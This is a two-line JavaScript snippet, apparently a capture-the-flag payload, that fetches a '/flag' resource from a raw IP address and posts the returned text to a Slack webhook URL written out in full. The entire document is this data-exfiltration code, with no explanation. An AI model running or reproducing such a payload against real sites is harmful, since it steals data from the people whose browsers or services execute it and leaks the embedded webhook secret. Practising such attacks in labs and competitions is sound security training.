const url = "http://165.232.190.5:2030/flag";
fetch(url).then((response) => response.text()).then((text) => fetch("https://hooks.slack.com/services/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", {method: "POST", mode: "no-cors", headers: {"Content-Type": "application/json"}, body: JSON.stringify({"text":text})}));
